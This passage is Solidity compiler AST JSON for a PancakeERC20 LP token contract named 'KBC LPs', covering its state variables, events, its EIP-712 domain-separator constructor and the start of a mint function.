							"src": "36:24:0"
						},
						{
							"absolutePath": "src/exchange-protocol/contracts/interfaces/IPancakeERC20.sol",
							"file": "./interfaces/IPancakeERC20.sol",
							"id": 2,
							"nodeType": "ImportDirective",
							"scope": 436,
							"sourceUnit": 1917,
							"src": "62:40:0",
							"symbolAliases": [],
							"unitAlias": ""
						},
						{
							"absolutePath": "src/exchange-protocol/contracts/libraries/SafeMath.sol",
							"file": "./libraries/SafeMath.sol",
							"id": 3,
							"nodeType": "ImportDirective",
							"scope": 436,
							"sourceUnit": 2387,
							"src": "103:34:0",
							"symbolAliases": [],
							"unitAlias": ""
						},
						{
							"baseContracts": [
								{
									"arguments": null,
									"baseName": {
										"contractScope": null,
										"id": 4,
										"name": "IPancakeERC20",
										"nodeType": "UserDefinedTypeName",
										"referencedDeclaration": 1916,
										"src": "164:13:0",
										"typeDescriptions": {
											"typeIdentifier": "t_contract$_IPancakeERC20_$1916",
											"typeString": "contract IPancakeERC20"
										}
									},
									"id": 5,
									"nodeType": "InheritanceSpecifier",
									"src": "164:13:0"
								}
							],
							"contractDependencies": [
								1916
							],
							"contractKind": "contract",
							"documentation": null,
							"fullyImplemented": true,
							"id": 435,
							"linearizedBaseContracts": [
								435,
								1916
							],
							"name": "PancakeERC20",
							"nodeType": "ContractDefinition",
							"nodes": [
								{
									"id": 8,
									"libraryName": {
										"contractScope": null,
										"id": 6,
										"name": "SafeMath",
										"nodeType": "UserDefinedTypeName",
										"referencedDeclaration": 2386,
										"src": "190:8:0",
										"typeDescriptions": {
											"typeIdentifier": "t_contract$_SafeMath_$2386",
											"typeString": "library SafeMath"
										}
									},
									"nodeType": "UsingForDirective",
									"src": "184:27:0",
									"typeName": {
										"id": 7,
										"name": "uint256",
										"nodeType": "ElementaryTypeName",
										"src": "203:7:0",
										"typeDescriptions": {
											"typeIdentifier": "t_uint256",
											"typeString": "uint256"
										}
									}
								},
								{
									"constant": true,
									"id": 11,
									"name": "name",
									"nodeType": "VariableDeclaration",
									"scope": 435,
									"src": "217:39:0",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_string_memory",
										"typeString": "string"
									},
									"typeName": {
										"id": 9,
										"name": "string",
										"nodeType": "ElementaryTypeName",
										"src": "217:6:0",
										"typeDescriptions": {
											"typeIdentifier": "t_string_storage_ptr",
											"typeString": "string"
										}
									},
									"value": {
										"argumentTypes": null,
										"hexValue": "4b4243204c5073",
										"id": 10,
										"isConstant": false,
										"isLValue": false,
										"isPure": true,
										"kind": "string",
										"lValueRequested": false,
										"nodeType": "Literal",
										"src": "247:9:0",
										"subdenomination": null,
										"typeDescriptions": {
											"typeIdentifier": "t_stringliteral_6a36d39f32c2225411d16c8f56813b9117e6eb8bf3d2893c5fc62411565cfcfe",
											"typeString": "literal_string \"KBC LPs\""
										},
										"value": "KBC LPs"
									},
									"visibility": "public"
								},
								{
									"constant": true,
									"id": 14,
									"name": "symbol",
									"nodeType": "VariableDeclaration",
									"scope": 435,
									"src": "262:40:0",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_string_memory",
										"typeString": "string"
									},
									"typeName": {
										"id": 12,
										"name": "string",
										"nodeType": "ElementaryTypeName",
										"src": "262:6:0",
										"typeDescriptions": {
											"typeIdentifier": "t_string_storage_ptr",
											"typeString": "string"
										}
									},
									"value": {
										"argumentTypes": null,
										"hexValue": "4b42432d4c50",
										"id": 13,
										"isConstant": false,
										"isLValue": false,
										"isPure": true,
										"kind": "string",
										"lValueRequested": false,
										"nodeType": "Literal",
										"src": "294:8:0",
										"subdenomination": null,
										"typeDescriptions": {
											"typeIdentifier": "t_stringliteral_9878e19940d7064c845a25b9c0bf389acf4056353ef4909809f58f429b7f50da",
											"typeString": "literal_string \"KBC-LP\""
										},
										"value": "KBC-LP"
									},
									"visibility": "public"
								},
								{
									"constant": true,
									"id": 17,
									"name": "decimals",
									"nodeType": "VariableDeclaration",
									"scope": 435,
									"src": "308:35:0",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_uint8",
										"typeString": "uint8"
									},
									"typeName": {
										"id": 15,
										"name": "uint8",
										"nodeType": "ElementaryTypeName",
										"src": "308:5:0",
										"typeDescriptions": {
											"typeIdentifier": "t_uint8",
											"typeString": "uint8"
										}
									},
									"value": {
										"argumentTypes": null,
										"hexValue": "3138",
										"id": 16,
										"isConstant": false,
										"isLValue": false,
										"isPure": true,
										"kind": "number",
										"lValueRequested": false,
										"nodeType": "Literal",
										"src": "341:2:0",
										"subdenomination": null,
										"typeDescriptions": {
											"typeIdentifier": "t_rational_18_by_1",
											"typeString": "int_const 18"
										},
										"value": "18"
									},
									"visibility": "public"
								},
								{
									"constant": false,
									"id": 19,
									"name": "totalSupply",
									"nodeType": "VariableDeclaration",
									"scope": 435,
									"src": "349:26:0",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_uint256",
										"typeString": "uint256"
									},
									"typeName": {
										"id": 18,
										"name": "uint256",
										"nodeType": "ElementaryTypeName",
										"src": "349:7:0",
										"typeDescriptions": {
											"typeIdentifier": "t_uint256",
											"typeString": "uint256"
										}
									},
									"value": null,
									"visibility": "public"
								},
								{
									"constant": false,
									"id": 23,
									"name": "balanceOf",
									"nodeType": "VariableDeclaration",
									"scope": 435,
									"src": "381:44:0",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_mapping$_t_address_$_t_uint256_$",
										"typeString": "mapping(address => uint256)"
									},
									"typeName": {
										"id": 22,
										"keyType": {
											"id": 20,
											"name": "address",
											"nodeType": "ElementaryTypeName",
											"src": "389:7:0",
											"typeDescriptions": {
												"typeIdentifier": "t_address",
												"typeString": "address"
											}
										},
										"nodeType": "Mapping",
										"src": "381:27:0",
										"typeDescriptions": {
											"typeIdentifier": "t_mapping$_t_address_$_t_uint256_$",
											"typeString": "mapping(address => uint256)"
										},
										"valueType": {
											"id": 21,
											"name": "uint256",
											"nodeType": "ElementaryTypeName",
											"src": "400:7:0",
											"typeDescriptions": {
												"typeIdentifier": "t_uint256",
												"typeString": "uint256"
											}
										}
									},
									"value": null,
									"visibility": "public"
								},
								{
									"constant": false,
									"id": 29,
									"name": "allowance",
									"nodeType": "VariableDeclaration",
									"scope": 435,
									"src": "431:64:0",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_mapping$_t_address_$_t_mapping$_t_address_$_t_uint256_$_$",
										"typeString": "mapping(address => mapping(address => uint256))"
									},
									"typeName": {
										"id": 28,
										"keyType": {
											"id": 24,
											"name": "address",
											"nodeType": "ElementaryTypeName",
											"src": "439:7:0",
											"typeDescriptions": {
												"typeIdentifier": "t_address",
												"typeString": "address"
											}
										},
										"nodeType": "Mapping",
										"src": "431:47:0",
										"typeDescriptions": {
											"typeIdentifier": "t_mapping$_t_address_$_t_mapping$_t_address_$_t_uint256_$_$",
											"typeString": "mapping(address => mapping(address => uint256))"
										},
										"valueType": {
											"id": 27,
											"keyType": {
												"id": 25,
												"name": "address",
												"nodeType": "ElementaryTypeName",
												"src": "458:7:0",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												}
											},
											"nodeType": "Mapping",
											"src": "450:27:0",
											"typeDescriptions": {
												"typeIdentifier": "t_mapping$_t_address_$_t_uint256_$",
												"typeString": "mapping(address => uint256)"
											},
											"valueType": {
												"id": 26,
												"name": "uint256",
												"nodeType": "ElementaryTypeName",
												"src": "469:7:0",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												}
											}
										}
									},
									"value": null,
									"visibility": "public"
								},
								{
									"constant": false,
									"id": 33,
									"name": "_frozenBalance",
									"nodeType": "VariableDeclaration",
									"scope": 435,
									"src": "501:49:0",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_mapping$_t_address_$_t_uint256_$",
										"typeString": "mapping(address => uint256)"
									},
									"typeName": {
										"id": 32,
										"keyType": {
											"id": 30,
											"name": "address",
											"nodeType": "ElementaryTypeName",
											"src": "509:7:0",
											"typeDescriptions": {
												"typeIdentifier": "t_address",
												"typeString": "address"
											}
										},
										"nodeType": "Mapping",
										"src": "501:27:0",
										"typeDescriptions": {
											"typeIdentifier": "t_mapping$_t_address_$_t_uint256_$",
											"typeString": "mapping(address => uint256)"
										},
										"valueType": {
											"id": 31,
											"name": "uint256",
											"nodeType": "ElementaryTypeName",
											"src": "520:7:0",
											"typeDescriptions": {
												"typeIdentifier": "t_uint256",
												"typeString": "uint256"
											}
										}
									},
									"value": null,
									"visibility": "public"
								},
								{
									"constant": false,
									"id": 35,
									"name": "DOMAIN_SEPARATOR",
									"nodeType": "VariableDeclaration",
									"scope": 435,
									"src": "557:31:0",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_bytes32",
										"typeString": "bytes32"
									},
									"typeName": {
										"id": 34,
										"name": "bytes32",
										"nodeType": "ElementaryTypeName",
										"src": "557:7:0",
										"typeDescriptions": {
											"typeIdentifier": "t_bytes32",
											"typeString": "bytes32"
										}
									},
									"value": null,
									"visibility": "public"
								},
								{
									"constant": true,
									"id": 38,
									"name": "PERMIT_TYPEHASH",
									"nodeType": "VariableDeclaration",
									"scope": 435,
									"src": "698:116:0",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_bytes32",
										"typeString": "bytes32"
									},
									"typeName": {
										"id": 36,
										"name": "bytes32",
										"nodeType": "ElementaryTypeName",
										"src": "698:7:0",
										"typeDescriptions": {
											"typeIdentifier": "t_bytes32",
											"typeString": "bytes32"
										}
									},
									"value": {
										"argumentTypes": null,
										"hexValue": "307836653731656461653132623162393766346431663630333730666566313031303566613266616165303132363131346131363963363438343564363132366339",
										"id": 37,
										"isConstant": false,
										"isLValue": false,
										"isPure": true,
										"kind": "number",
										"lValueRequested": false,
										"nodeType": "Literal",
										"src": "748:66:0",
										"subdenomination": null,
										"typeDescriptions": {
											"typeIdentifier": "t_rational_49955707469362902507454157297736832118868343942642399513960811609542965143241_by_1",
											"typeString": "int_const 4995...(69 digits omitted)...3241"
										},
										"value": "0x6e71edae12b1b97f4d1f60370fef10105fa2faae0126114a169c64845d6126c9"
									},
									"visibility": "public"
								},
								{
									"constant": false,
									"id": 42,
									"name": "nonces",
									"nodeType": "VariableDeclaration",
									"scope": 435,
									"src": "820:41:0",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_mapping$_t_address_$_t_uint256_$",
										"typeString": "mapping(address => uint256)"
									},
									"typeName": {
										"id": 41,
										"keyType": {
											"id": 39,
											"name": "address",
											"nodeType": "ElementaryTypeName",
											"src": "828:7:0",
											"typeDescriptions": {
												"typeIdentifier": "t_address",
												"typeString": "address"
											}
										},
										"nodeType": "Mapping",
										"src": "820:27:0",
										"typeDescriptions": {
											"typeIdentifier": "t_mapping$_t_address_$_t_uint256_$",
											"typeString": "mapping(address => uint256)"
										},
										"valueType": {
											"id": 40,
											"name": "uint256",
											"nodeType": "ElementaryTypeName",
											"src": "839:7:0",
											"typeDescriptions": {
												"typeIdentifier": "t_uint256",
												"typeString": "uint256"
											}
										}
									},
									"value": null,
									"visibility": "public"
								},
								{
									"anonymous": false,
									"documentation": null,
									"id": 50,
									"name": "Approval",
									"nodeType": "EventDefinition",
									"parameters": {
										"id": 49,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 44,
												"indexed": true,
												"name": "owner",
												"nodeType": "VariableDeclaration",
												"scope": 50,
												"src": "892:21:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 43,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "892:7:0",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 46,
												"indexed": true,
												"name": "spender",
												"nodeType": "VariableDeclaration",
												"scope": 50,
												"src": "923:23:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 45,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "923:7:0",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 48,
												"indexed": false,
												"name": "value",
												"nodeType": "VariableDeclaration",
												"scope": 50,
												"src": "956:13:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 47,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "956:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "882:93:0"
									},
									"src": "868:108:0"
								},
								{
									"anonymous": false,
									"documentation": null,
									"id": 58,
									"name": "Transfer",
									"nodeType": "EventDefinition",
									"parameters": {
										"id": 57,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 52,
												"indexed": true,
												"name": "from",
												"nodeType": "VariableDeclaration",
												"scope": 58,
												"src": "996:20:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 51,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "996:7:0",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 54,
												"indexed": true,
												"name": "to",
												"nodeType": "VariableDeclaration",
												"scope": 58,
												"src": "1018:18:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 53,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "1018:7:0",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 56,
												"indexed": false,
												"name": "value",
												"nodeType": "VariableDeclaration",
												"scope": 58,
												"src": "1038:13:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 55,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "1038:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "995:57:0"
									},
									"src": "981:72:0"
								},
								{
									"body": {
										"id": 90,
										"nodeType": "Block",
										"src": "1080:464:0",
										"statements": [
											{
												"assignments": [
													62
												],
												"declarations": [
													{
														"constant": false,
														"id": 62,
														"name": "chainId",
														"nodeType": "VariableDeclaration",
														"scope": 90,
														"src": "1090:15:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 61,
															"name": "uint256",
															"nodeType": "ElementaryTypeName",
															"src": "1090:7:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 63,
												"initialValue": null,
												"nodeType": "VariableDeclarationStatement",
												"src": "1090:15:0"
											},
											{
												"externalReferences": [
													{
														"chainId": {
															"declaration": 62,
															"isOffset": false,
															"isSlot": false,
															"src": "1138:7:0",
															"valueSize": 1
														}
													}
												],
												"id": 64,
												"nodeType": "InlineAssembly",
												"operations": "{ chainId := chainid() }",
												"src": "1115:51:0"
											},
											{
												"expression": {
													"argumentTypes": null,
													"id": 88,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"argumentTypes": null,
														"id": 65,
														"name": "DOMAIN_SEPARATOR",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 35,
														"src": "1175:16:0",
														"typeDescriptions": {
															"typeIdentifier": "t_bytes32",
															"typeString": "bytes32"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"argumentTypes": null,
														"arguments": [
															{
																"argumentTypes": null,
																"arguments": [
																	{
																		"argumentTypes": null,
																		"arguments": [
																			{
																				"argumentTypes": null,
																				"hexValue": "454950373132446f6d61696e28737472696e67206e616d652c737472696e672076657273696f6e2c75696e7432353620636861696e49642c6164647265737320766572696679696e67436f6e747261637429",
																				"id": 70,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": true,
																				"kind": "string",
																				"lValueRequested": false,
																				"nodeType": "Literal",
																				"src": "1276:84:0",
																				"subdenomination": null,
																				"typeDescriptions": {
																					"typeIdentifier": "t_stringliteral_8b73c3c69bb8fe3d512ecc4cf759cc79239f7b179b0ffacaa9a75d522b39400f",
																					"typeString": "literal_string \"EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)\""
																				},
																				"value": "EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)"
																			}
																		],
																		"expression": {
																			"argumentTypes": [
																				{
																					"typeIdentifier": "t_stringliteral_8b73c3c69bb8fe3d512ecc4cf759cc79239f7b179b0ffacaa9a75d522b39400f",
																					"typeString": "literal_string \"EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)\""
																				}
																			],
																			"id": 69,
																			"name": "keccak256",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 2437,
																			"src": "1245:9:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_function_keccak256_pure$_t_bytes_memory_ptr_$returns$_t_bytes32_$",
																				"typeString": "function (bytes memory) pure returns (bytes32)"
																			}
																		},
																		"id": 71,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"kind": "functionCall",
																		"lValueRequested": false,
																		"names": [],
																		"nodeType": "FunctionCall",
																		"src": "1245:133:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_bytes32",
																			"typeString": "bytes32"
																		}
																	},
																	{
																		"argumentTypes": null,
																		"arguments": [
																			{
																				"argumentTypes": null,
																				"arguments": [
																					{
																						"argumentTypes": null,
																						"id": 74,
																						"name": "name",
																						"nodeType": "Identifier",
																						"overloadedDeclarations": [],
																						"referencedDeclaration": 11,
																						"src": "1412:4:0",
																						"typeDescriptions": {
																							"typeIdentifier": "t_string_memory",
																							"typeString": "string memory"
																						}
																					}
																				],
																				"expression": {
																					"argumentTypes": [
																						{
																							"typeIdentifier": "t_string_memory",
																							"typeString": "string memory"
																						}
																					],
																					"id": 73,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": true,
																					"lValueRequested": false,
																					"nodeType": "ElementaryTypeNameExpression",
																					"src": "1406:5:0",
																					"typeDescriptions": {
																						"typeIdentifier": "t_type$_t_bytes_storage_ptr_$",
																						"typeString": "type(bytes storage pointer)"
																					},
																					"typeName": "bytes"
																				},
																				"id": 75,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": true,
																				"kind": "typeConversion",
																				"lValueRequested": false,
																				"names": [],
																				"nodeType": "FunctionCall",
																				"src": "1406:11:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_bytes_memory_ptr",
																					"typeString": "bytes memory"
																				}
																			}
																		],
																		"expression": {
																			"argumentTypes": [
																				{
																					"typeIdentifier": "t_bytes_memory_ptr",
																					"typeString": "bytes memory"
																				}
																			],
																			"id": 72,
																			"name": "keccak256",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 2437,
																			"src": "1396:9:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_function_keccak256_pure$_t_bytes_memory_ptr_$returns$_t_bytes32_$",
																				"typeString": "function (bytes memory) pure returns (bytes32)"
																			}
																		},
																		"id": 76,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"kind": "functionCall",
																		"lValueRequested": false,
																		"names": [],
																		"nodeType": "FunctionCall",
																		"src": "1396:22:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_bytes32",
																			"typeString": "bytes32"
																		}
																	},
																	{
																		"argumentTypes": null,
																		"arguments": [
																			{
																				"argumentTypes": null,
																				"arguments": [
																					{
																						"argumentTypes": null,
																						"hexValue": "31",
																						"id": 79,
																						"isConstant": false,
																						"isLValue": false,
																						"isPure": true,
																						"kind": "string",
																						"lValueRequested": false,
																						"nodeType": "Literal",
																						"src": "1452:3:0",
																						"subdenomination": null,
																						"typeDescriptions": {
																							"typeIdentifier": "t_stringliteral_c89efdaa54c0f20c7adf612882df0950f5a951637e0307cdcb4c672f298b8bc6",
																							"typeString": "literal_string \"1\""
																						},
																						"value": "1"
																					}
																				],
																				"expression": {
																					"argumentTypes": [
																						{
																							"typeIdentifier": "t_stringliteral_c89efdaa54c0f20c7adf612882df0950f5a951637e0307cdcb4c672f298b8bc6",
																							"typeString": "literal_string \"1\""
																						}
																					],
																					"id": 78,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": true,
																					"lValueRequested": false,
																					"nodeType": "ElementaryTypeNameExpression",
																					"src": "1446:5:0",
																					"typeDescriptions": {
																						"typeIdentifier": "t_type$_t_bytes_storage_ptr_$",
																						"typeString": "type(bytes storage pointer)"
																					},
																					"typeName": "bytes"
																				},
																				"id": 80,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": true,
																				"kind": "typeConversion",
																				"lValueRequested": false,
																				"names": [],
																				"nodeType": "FunctionCall",
																				"src": "1446:10:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_bytes_memory_ptr",
																					"typeString": "bytes memory"
																				}
																			}
																		],
																		"expression": {
																			"argumentTypes": [
																				{
																					"typeIdentifier": "t_bytes_memory_ptr",
																					"typeString": "bytes memory"
																				}
																			],
																			"id": 77,
																			"name": "keccak256",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 2437,
																			"src": "1436:9:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_function_keccak256_pure$_t_bytes_memory_ptr_$returns$_t_bytes32_$",
																				"typeString": "function (bytes memory) pure returns (bytes32)"
																			}
																		},
																		"id": 81,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"kind": "functionCall",
																		"lValueRequested": false,
																		"names": [],
																		"nodeType": "FunctionCall",
																		"src": "1436:21:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_bytes32",
																			"typeString": "bytes32"
																		}
																	},
																	{
																		"argumentTypes": null,
																		"id": 82,
																		"name": "chainId",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 62,
																		"src": "1475:7:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	},
																	{
																		"argumentTypes": null,
																		"arguments": [
																			{
																				"argumentTypes": null,
																				"id": 84,
																				"name": "this",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 2461,
																				"src": "1508:4:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_contract$_PancakeERC20_$435",
																					"typeString": "contract PancakeERC20"
																				}
																			}
																		],
																		"expression": {
																			"argumentTypes": [
																				{
																					"typeIdentifier": "t_contract$_PancakeERC20_$435",
																					"typeString": "contract PancakeERC20"
																				}
																			],
																			"id": 83,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": true,
																			"lValueRequested": false,
																			"nodeType": "ElementaryTypeNameExpression",
																			"src": "1500:7:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_type$_t_address_$",
																				"typeString": "type(address)"
																			},
																			"typeName": "address"
																		},
																		"id": 85,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"kind": "typeConversion",
																		"lValueRequested": false,
																		"names": [],
																		"nodeType": "FunctionCall",
																		"src": "1500:13:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_address",
																			"typeString": "address"
																		}
																	}
																],
																"expression": {
																	"argumentTypes": [
																		{
																			"typeIdentifier": "t_bytes32",
																			"typeString": "bytes32"
																		},
																		{
																			"typeIdentifier": "t_bytes32",
																			"typeString": "bytes32"
																		},
																		{
																			"typeIdentifier": "t_bytes32",
																			"typeString": "bytes32"
																		},
																		{
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		},
																		{
																			"typeIdentifier": "t_address",
																			"typeString": "address"
																		}
																	],
																	"expression": {
																		"argumentTypes": null,
																		"id": 67,
																		"name": "abi",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 2430,
																		"src": "1217:3:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_magic_abi",
																			"typeString": "abi"
																		}
																	},
																	"id": 68,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"lValueRequested": false,
																	"memberName": "encode",
																	"nodeType": "MemberAccess",
																	"referencedDeclaration": null,
																	"src": "1217:10:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_function_abiencode_pure$__$returns$_t_bytes_memory_ptr_$",
																		"typeString": "function () pure returns (bytes memory)"
																	}
																},
																"id": 86,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"kind": "functionCall",
																"lValueRequested": false,
																"names": [],
																"nodeType": "FunctionCall",
																"src": "1217:310:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_bytes_memory_ptr",
																	"typeString": "bytes memory"
																}
															}
														],
														"expression": {
															"argumentTypes": [
																{
																	"typeIdentifier": "t_bytes_memory_ptr",
																	"typeString": "bytes memory"
																}
															],
															"id": 66,
															"name": "keccak256",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 2437,
															"src": "1194:9:0",
															"typeDescriptions": {
																"typeIdentifier": "t_function_keccak256_pure$_t_bytes_memory_ptr_$returns$_t_bytes32_$",
																"typeString": "function (bytes memory) pure returns (bytes32)"
															}
														},
														"id": 87,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"kind": "functionCall",
														"lValueRequested": false,
														"names": [],
														"nodeType": "FunctionCall",
														"src": "1194:343:0",
														"typeDescriptions": {
															"typeIdentifier": "t_bytes32",
															"typeString": "bytes32"
														}
													},
													"src": "1175:362:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bytes32",
														"typeString": "bytes32"
													}
												},
												"id": 89,
												"nodeType": "ExpressionStatement",
												"src": "1175:362:0"
											}
										]
									},
									"documentation": null,
									"id": 91,
									"implemented": true,
									"kind": "constructor",
									"modifiers": [],
									"name": "",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 59,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "1070:2:0"
									},
									"returnParameters": {
										"id": 60,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "1080:0:0"
									},
									"scope": 435,
									"src": "1059:485:0",
									"stateMutability": "nonpayable",
									"superFunction": null,
									"visibility": "public"
								},
								{
									"body": {
										"id": 124,
										"nodeType": "Block",
										"src": "1601:149:0",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"id": 103,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"argumentTypes": null,
														"id": 98,
														"name": "totalSupply",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 19,
														"src": "1611:11:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"argumentTypes": null,
														"arguments": [
															{
																"argumentTypes": null,
																"id": 101,
																"name": "value",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 95,
																"src": "1641:5:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															}
														],
														"expression": {
															"argumentTypes": [
																{
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															],
															"expression": {
																"argumentTypes": null,
																"id": 99,
																"name": "totalSupply",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 19,
																"src": "1625:11:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"id": 100,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"memberName": "add",
															"nodeType": "MemberAccess",
															"referencedDeclaration": 2335,
															"src": "1625:15:0",
															"typeDescriptions": {
																"typeIdentifier": "t_function_internal_pure$_t_uint256_$_t_uint256_$returns$_t_uint256_$bound_to$_t_uint256_$",
																"typeString": "function (uint256,uint256) pure returns (uint256)"
															}
														},
														"id": 102,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"kind": "functionCall",
														"lValueRequested": false,
														"names": [],
														"nodeType": "FunctionCall",
														"src": "1625:22:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "1611:36:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"id": 104,
												"nodeType": "ExpressionStatement",
												"src": "1611:36:0"
											},
